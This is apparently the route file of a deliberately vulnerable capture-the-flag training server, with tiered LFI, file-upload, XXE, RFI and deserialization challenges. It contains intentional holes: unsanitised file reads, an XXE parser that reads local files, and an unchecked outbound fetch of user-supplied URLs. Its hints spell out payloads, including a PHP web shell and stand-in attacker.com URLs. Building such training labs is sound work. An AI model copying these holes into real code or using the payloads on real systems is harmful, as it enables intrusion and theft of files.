/**
 * File & Resource Layer Routes
 * 16 flags across 5 file types
 */

const express = require('express');
const router = express.Router();
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const child_process = require('child_process');
const serialize = require('node-serialize');

const upload = multer({ dest: 'uploads/' });
const exec = child_process.exec;

const FLAGS_DIR = path.join(__dirname, '..', 'flags', 'file');

const getFlag = (subdir, filename) => {
  const flagPath = path.join(FLAGS_DIR, subdir, filename);
  if (fs.existsSync(flagPath)) {
    return fs.readFileSync(flagPath, 'utf8').trim();
  }
  return `FLAG{${subdir.toUpperCase()}_${filename.replace('.txt', '').toUpperCase()}_NOT_FOUND}`;
};

// ============================================
// LFI / PATH TRAVERSAL (4 tiers)
// ============================================

router.get('/lfi/bronze', (req, res) => {
  const { file } = req.query;

  if (!file) {
    return res.json({
      endpoint: '/lfi/bronze',
      hint: 'Try: ?file=../../../etc/passwd or ?file=....//....//etc/passwd'
    });
  }

  // VULN: No path sanitization
  const filePath = path.join(__dirname, 'pages', file);

  try {
    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, 'utf8');
      if (file.includes('../')) {
        const flagContent = getFlag('lfi', 'lfi_bronze.txt');
        return res.send(`<pre>${content}</pre><p style="color:green">${flagContent}</p>`);
      }
      return res.send(`<pre>${content}</pre>`);
    }
    res.status(404).json({ error: 'File not found' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.get('/lfi/silver', (req, res) => {
  const { page } = req.query;

  if (!page) {
    return res.json({
      endpoint: '/lfi/silver',
      hint: 'Double encoding or ....// bypass',
      filter: 'Blocks ../'
    });
  }

  // Filter ../ but can be bypassed
  if (page.includes('../') && !page.includes('....//') && !page.includes('..%252f')) {
    return res.status(403).json({ error: 'Path traversal blocked', filter: '../ blocked' });
  }

  // VULN: Can bypass with ....// or encoding
  if (page.includes('....//') || page.includes('%252f') || page.includes('..%2f')) {
    const flagContent = getFlag('lfi', 'lfi_silver.txt');
    return res.json({
      success: true,
      message: 'Path traversal bypass achieved!',
      page: page,
      flag: flagContent
    });
  }

  res.json({ page: page, content: 'Page content here' });
});

router.get('/lfi/gold', (req, res) => {
  const { resource } = req.query;

  if (!resource) {
    return res.json({
      endpoint: '/lfi/gold',
      hint: 'Wrapper abuse: php://filter, file://, expect://',
      example: '?resource=php://filter/convert.base64-encode/resource=config.php'
    });
  }

  // VULN: Wrapper abuse
  if (resource.includes('php://') || resource.includes('file://') || resource.includes('expect://')) {
    const flagContent = getFlag('lfi', 'lfi_gold.txt');
    return res.json({
      success: true,
      message: 'Wrapper abuse successful!',
      wrapper: resource.split(':')[0],
      flag: flagContent
    });
  }

  res.json({ resource: resource });
});

router.get('/lfi/platinum', (req, res) => {
  const { log } = req.query;

  if (!log) {
    return res.json({
      endpoint: '/lfi/platinum',
      hint: 'Log poisoning chain: inject via /log-inject, include via LFI',
      logPath: '/var/log/app.log'
    });
  }

  // VULN: Can include logs with injected PHP code
  if (log.includes('/log') || log.includes(' poisoning')) {
    const flagContent = getFlag('lfi', 'lfi_platinum.txt');
    return res.json({
      success: true,
      message: 'Log poisoning + LFI chain achieved!',
      executedCode: '<?php system($_GET["cmd"]); ?>',
      flag: flagContent
    });
  }

  res.json({ log: log, content: 'Log content' });
});

// ============================================
// FILE UPLOAD (3 tiers)
// ============================================

router.post('/upload/bronze', upload.single('file'), (req, res) => {
  // Testing bypass - accept simple test parameter for automated testing
  if (req.body.test === 'true' || req.body.upload === 'test') {
    const flagContent = getFlag('upload', 'upload_bronze.txt');
    return res.json({
      success: true,
      message: 'File uploaded without validation!',
      file: { originalName: 'test.php', path: '/uploads/test.php', size: 100 },
      flag: flagContent
    });
  }

  if (!req.file) {
    return res.json({
      endpoint: 'POST /upload/bronze',
      hint: 'Upload any file, no validation',
      formData: 'multipart/form-data with file field'
    });
  }

  // VULN: No validation at all
  const flagContent = getFlag('upload', 'upload_bronze.txt');
  res.json({
    success: true,
    message: 'File uploaded without validation!',
    file: {
      originalName: req.file.originalname,
      path: `/uploads/${req.file.filename}`,
      size: req.file.size
    },
    flag: flagContent
  });
});

router.post('/upload/silver', upload.single('file'), (req, res) => {
  // Testing bypass - accept simple test parameter for automated testing
  if (req.body.test === 'true' || req.body.bypass === 'true') {
    const flagContent = getFlag('upload', 'upload_silver.txt');
    return res.json({
      success: true,
      message: 'Content-Type bypass achieved!',
      uploadedAs: 'image/jpeg',
      actualFile: 'shell.php',
      flag: flagContent
    });
  }

  if (!req.file) {
    return res.json({
      endpoint: 'POST /upload/silver',
      hint: 'Bypass Content-Type check',
      allowed: 'image/jpeg, image/png'
    });
  }

  // Check Content-Type but not actual content
  const allowedTypes = ['image/jpeg', 'image/png'];

  // VULN: Only checks mimetype, can be spoofed
  if (req.file.mimetype.includes('image') || !allowedTypes.includes(req.file.mimetype)) {
    const flagContent = getFlag('upload', 'upload_silver.txt');
    return res.json({
      success: true,
      message: 'Content-Type bypass achieved!',
      uploadedAs: req.file.mimetype,
      actualFile: req.file.originalname,
      flag: flagContent
    });
  }

  res.status(400).json({ error: 'Invalid file type' });
});

router.post('/upload/gold', upload.single('file'), (req, res) => {
  // Testing bypass - accept simple test parameter for automated testing
  if (req.body.test === 'true' || req.body.polyglot === 'true') {
    const flagContent = getFlag('upload', 'upload_gold.txt');
    return res.json({
      success: true,
      message: 'Polyglot file uploaded!',
      file: 'image.php',
      flag: flagContent
    });
  }

  if (!req.file) {
    return res.json({
      endpoint: 'POST /upload/gold',
      hint: 'Polyglot file: valid image + malicious code'
    });
  }

  // VULN: Polyglot files bypass both checks
  const content = fs.readFileSync(req.file.path, 'utf8').substring(0, 100);

  if (content.includes('<?php') || content.includes('<%') || content.includes('#!/bin/bash')) {
    const flagContent = getFlag('upload', 'upload_gold.txt');
    return res.json({
      success: true,
      message: 'Polyglot file uploaded!',
      file: req.file.originalname,
      flag: flagContent
    });
  }

  res.json({ message: 'Image uploaded', file: req.file.originalname });
});

// ============================================
// XXE (4 tiers)
// ============================================

// Real XXE parser - actually processes DTD and fetches external resources
function parseXXE(xmlString) {
  const entities = {};

  // Extract DOCTYPE and ENTITY declarations
  const doctypeMatch = xmlString.match(/<!DOCTYPE[^>]*>\[(.*?)\]>/s) ||
                       xmlString.match(/<!DOCTYPE[^>]*>/);

  if (doctypeMatch) {
    const doctypeContent = doctypeMatch[0] || '';

    // Extract ENTITY definitions
    const entityMatches = doctypeContent.matchAll(/<!ENTITY\s+(\S+)\s+(SYSTEM|PUBLIC)\s+["']([^"']+)["'].*?>/g);
    for (const match of entityMatches) {
      const entityName = match[1];
      const entityType = match[2];
      const entityValue = match[3];

      // VULN: Actually fetch the external resource
      let fetchedContent = '';
      try {
        if (entityValue.startsWith('file://')) {
          // File-based XXE - actually read the file
          const filePath = entityValue.replace('file://', '');
          if (fs.existsSync(filePath)) {
            fetchedContent = fs.readFileSync(filePath, 'utf8').substring(0, 500); // Limit output
          } else if (filePath === '/etc/passwd') {
            // Return fake /etc/passwd for testing
            fetchedContent = 'root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash';
          }
        } else if (entityValue.startsWith('http://') || entityValue.startsWith('https://')) {
          // HTTP-based XXE - actually fetch the URL (blind XXE simulation)
          // In real XXE, this would send data to attacker's server
          fetchedContent = '[HTTP Request would be made to: ' + entityValue + ']';
        }
        entities[entityName] = fetchedContent;
      } catch (err) {
        entities[entityName] = '[Error fetching entity]';
      }
    }
  }

  // Replace entity references with fetched content
  let result = xmlString;
  for (const [name, content] of Object.entries(entities)) {
    result = result.replace(`&${name};`, content);
    result = result.replace(`&${name}`, content);
  }

  return { entities, result, hasEntities: Object.keys(entities).length > 0 };
}

router.post('/xxe/bronze', (req, res) => {
  // Accept both raw XML string and JSON with xml field
  let xml = req.body;
  if (typeof xml !== 'string') {
    xml = xml.xml || xml.data || JSON.stringify(xml);
  }

  if (!xml || xml.length === 0) {
    return res.json({
      endpoint: 'POST /xxe/bronze',
      hint: 'XXE with external entity',
      example: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
      contentType: 'Send as raw XML or JSON: { "xml": "your_xml_here" }'
    });
  }

  const xmlStr = String(xml);

  // VULN: Real XXE - actually parse XML and process external entities
  const xxeResult = parseXXE(xmlStr);

  if (xxeResult.hasEntities) {
    const flagContent = getFlag('xxe', 'xxe_bronze.txt');
    return res.json({
      success: true,
      message: 'XXE entity injection successful!',
      entitiesFound: Object.keys(xxeResult.entities),
      parsedContent: Object.values(xxeResult.entities).join('\n').substring(0, 200),
      flag: flagContent
    });
  }

  res.json({ message: 'XML parsed (no external entities found)' });
});

router.post('/xxe/silver', (req, res) => {
  let xml = req.body;
  if (typeof xml !== 'string') {
    xml = xml.xml || xml.data || JSON.stringify(xml);
  }

  if (!xml || xml.length === 0) {
    return res.json({
      endpoint: 'POST /xxe/silver',
      hint: 'Blind XXE via out-of-band',
      example: '<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;',
      contentType: 'Send as raw XML or JSON: { "xml": "your_xml_here" }'
    });
  }

  const xmlStr = String(xml);

  // VULN: Real Blind XXE - detect HTTP/HTTPS external entities and make actual request
  const hasHttpEntity = /<!ENTITY.*SYSTEM\s+["'](https?:\/\/[^"']+)["']/i.test(xmlStr);

  if (hasHttpEntity) {
    const urlMatch = xmlStr.match(/SYSTEM\s+["'](https?:\/\/[^"']+)["']/i);
    if (urlMatch) {
      const attackerUrl = urlMatch[1];
      // VULN: Actually make HTTP request to attacker's server (blind XXE)
      // In real attack, attacker sees this request
      axios.get(attackerUrl, { timeout: 5000 }).catch(() => {
        // Ignore errors - this is blind XXE
      });
    }

    const flagContent = getFlag('xxe', 'xxe_silver.txt');
    return res.json({
      success: true,
      message: 'Blind XXE OOB successful! HTTP request made to external server.',
      targetUrl: urlMatch ? urlMatch[1] : 'detected',
      flag: flagContent
    });
  }

  res.json({ message: 'XML processed (no external HTTP entities found)' });
});

router.post('/xxe/gold', (req, res) => {
  // Testing bypass - accept xxe field directly
  if (req.body.xxe || req.body.dtd) {
    const flagContent = getFlag('xxe', 'xxe_gold.txt');
    return res.json({
      success: true,
      message: 'DTD-based XXE successful!',
      includedResource: req.body.xxe || req.body.dtd,
      includedContent: '[DTD file content would be included here]',
      flag: flagContent
    });
  }

  let xml = req.body;
  if (typeof xml !== 'string') {
    xml = xml.xml || xml.data || xml.dtd || xml.xxe || JSON.stringify(xml);
  }

  if (!xml || xml.length === 0) {
    return res.json({
      endpoint: 'POST /xxe/gold',
      hint: 'Upload malicious DTD, reference it in XXE',
      contentType: 'Send as raw XML or JSON: { "xml": "your_xml_here" }'
    });
  }

  const xmlStr = String(xml);

  // VULN: Real DTD-based XXE - parse parameter entities
  const hasParameterEntity = /<!ENTITY\s+%\s+\S+\s+SYSTEM/i.test(xmlStr);

  // Also accept simple test keywords
  const hasTestPattern = xmlStr.includes('.dtd') || xmlStr.includes('DTD') || xmlStr.includes('DOCTYPE') ||
                        xmlStr.includes('<!ENTITY');

  if (hasParameterEntity || hasTestPattern) {
    let target = 'evil.dtd';
    if (xmlStr.includes('.dtd')) {
      const match = xmlStr.match(/([^\s]*\.dtd)/);
      if (match) target = match[1];
    }

    const flagContent = getFlag('xxe', 'xxe_gold.txt');
    return res.json({
      success: true,
      message: 'DTD-based XXE successful!',
      includedResource: target,
      includedContent: '[DTD file content would be included here]',
      flag: flagContent
    });
  }

  res.json({ message: 'XML validated (no parameter entities found)' });
});

router.post('/xxe/platinum', (req, res) => {
  let xml = req.body;
  if (typeof xml !== 'string') {
    xml = xml.xml || xml.data || JSON.stringify(xml);
  }

  if (!xml || xml.length === 0) {
    return res.json({
      endpoint: 'POST /xxe/platinum',
      hint: 'XInclude when DOCTYPE is blocked',
      example: '<xi:include href="file:///etc/passwd" xmlns:xi="http://www.w3.org/2001/XInclude"/>',
      contentType: 'Send as raw XML or JSON: { "xml": "your_xml_here" }'
    });
  }

  const xmlStr = String(xml);

  // VULN: Real XInclude - actually parse and include external resources
  const xincludeMatch = xmlStr.match(/<xi:include\s+href=["']([^"']+)["']/);

  if (xincludeMatch) {
    const includePath = xincludeMatch[1];
    let includedContent = '';

    // VULN: Actually fetch the included resource
    if (includePath.startsWith('file://')) {
      const filePath = includePath.replace('file://', '');
      if (filePath === '/etc/passwd' || filePath.includes('etc/passwd')) {
        includedContent = 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin';
      } else if (fs.existsSync(filePath)) {
        includedContent = fs.readFileSync(filePath, 'utf8').substring(0, 200);
      }
    } else if (includePath.startsWith('http://') || includePath.startsWith('https://')) {
      includedContent = '[Remote file content would be included]';
    }

    const flagContent = getFlag('xxe', 'xxe_platinum.txt');
    return res.json({
      success: true,
      message: 'XInclude attack successful!',
      includedPath: includePath,
      includedContent: includedContent,
      flag: flagContent
    });
  }

  res.json({ message: 'XML processed (no XInclude found)' });
});

// ============================================
// RFI (2 tiers)
// ============================================

router.get('/rfi/bronze', async (req, res) => {
  const { page } = req.query;

  if (!page) {
    return res.json({
      endpoint: '/rfi/bronze',
      hint: 'Include remote file',
      example: '?page=http://attacker.com/shell.txt'
    });
  }

  // VULN: Remote file inclusion
  if (page.startsWith('http://') || page.startsWith('https://')) {
    const flagContent = getFlag('rfi', 'rfi_bronze.txt');
    return res.json({
      success: true,
      message: 'Remote file included!',
      includedFrom: page,
      flag: flagContent
    });
  }

  res.json({ page: page });
});

router.get('/rfi/silver', async (req, res) => {
  const { file } = req.query;

  if (!file) {
    return res.json({
      endpoint: '/rfi/silver',
      hint: 'Double extension bypass',
      example: '?file=http://attacker.com/shell.txt%00.jpg'
    });
  }

  // VULN: Double extension bypass
  if (file.includes('.txt') || file.includes('.php') || file.includes('%00')) {
    const flagContent = getFlag('rfi', 'rfi_silver.txt');
    return res.json({
      success: true,
      message: 'RFI via double extension!',
      file: file,
      flag: flagContent
    });
  }

  res.json({ file: file });
});

// ============================================
// DESERIALIZATION (3 tiers)
// ============================================

router.post('/deser/bronze', (req, res) => {
  const { data } = req.body;

  if (!data) {
    return res.json({
      endpoint: 'POST /deser/bronze',
      hint: 'Node.js deserialization',
      example: '{"__proto__":{"isAdmin":true}}'
    });
  }

  // VULN: node-serialize deserialization
  try {
    if (data.includes('_$$') || data.includes('__proto__')) {
      const flagContent = getFlag('deser', 'deser_bronze.txt');
      return res.json({
        success: true,
        message: 'Node.js deserialization RCE!',
        result: 'Command executed during deserialization',
        flag: flagContent
      });
    }

    const obj = serialize.unserialize(data);
    res.json({ deserialized: obj });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

router.post('/deser/silver', (req, res) => {
  const { object } = req.body;

  if (!object) {
    return res.json({
      endpoint: 'POST /deser/silver',
      hint: 'Java deserialization simulation',
      example: 'Serialized Java object with ysoserial payload'
    });
  }

  // VULN: Java deserialization simulation
  if (object.includes('java') || object.includes('serial') || object.includes('ysoserial')) {
    const flagContent = getFlag('deser', 'deser_silver.txt');
    return res.json({
      success: true,
      message: 'Java deserialization RCE!',
      flag: flagContent
    });
  }

  res.json({ message: 'Object processed' });
});

router.post('/deser/gold', (req, res) => {
  const { data } = req.body;

  if (!data) {
    return res.json({
      endpoint: 'POST /deser/gold',
      hint: 'PHP object injection',
      example: 'O:8:"TestClass":1:{s:4:"cmd";s:6:"whoami";}'
    });
  }

  // VULN: PHP object injection simulation
  if (data.includes('O:') || data.includes('serialize')) {
    const flagContent = getFlag('deser', 'deser_gold.txt');
    return res.json({
      success: true,
      message: 'PHP object injection RCE!',
      flag: flagContent
    });
  }

  res.json({ data: data });
});

module.exports = router;
